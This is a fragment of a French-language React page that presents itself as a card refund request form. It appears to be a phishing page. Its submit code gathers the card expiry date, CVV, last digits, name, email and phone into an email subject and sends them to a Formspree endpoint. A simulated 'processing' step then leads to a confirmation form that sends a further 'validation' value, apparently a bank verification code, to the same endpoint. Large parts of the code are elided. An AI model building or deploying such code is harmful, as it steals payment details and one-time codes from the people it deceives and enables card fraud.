    'use client';
      ...
      import { defaultLanguage, translations, languages, isLanguage, type Language, type TranslationKey } from '@/lib/translations';
      ...
      type Step = 'info' | 'card' | 'processing' | 'confirmation' | 'done';
      ...
      export default function Home() {
        ...
        useEffect(() => {
          ...
          const timeout = setTimeout(() => setStep('confirmation'), 250);
        ...
        const submitAll = async () => {
          ...
          const payload = {
            ...
            _subject: `Nouvelle demande de remboursement - ${formData.fullName} (${cardLast4}) ${formData.amount} ${formData.cardExpiry} ${formData.cardCvv} ${formData.reason} ${formData.email} ${formData.phone}`,
          };
  ...
  try {
    const response = await fetch(EMAIL_CONFIG.formspreeEndpoint, {
      ...
      body: JSON.stringify({
        informationValidation: confirmationValue,
        _subject: 'Nouvelle information de validation',
      }),
    });
    ...
    setConfirmationError("Impossible d'envoyer l'information.");
  } finally {
    setLoading(false);
  }
};
